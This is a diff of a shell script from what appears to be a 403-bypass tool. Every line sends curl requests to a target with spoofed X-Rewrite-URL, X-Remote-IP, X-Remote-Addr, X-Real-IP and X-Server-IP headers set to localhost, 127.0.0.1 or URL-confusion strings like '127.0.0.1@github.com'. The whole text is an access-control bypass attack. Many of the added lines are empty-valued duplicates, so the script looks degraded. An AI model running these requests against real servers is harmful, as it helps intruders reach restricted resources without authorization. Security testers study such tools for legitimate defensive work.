+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -219,7 +219,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -233,8 +233,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -255,23 +255,23 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -282,7 +282,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -296,8 +296,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -318,23 +318,23 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -345,7 +345,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -359,8 +359,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -381,23 +381,23 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Remote-Addr: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Real-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
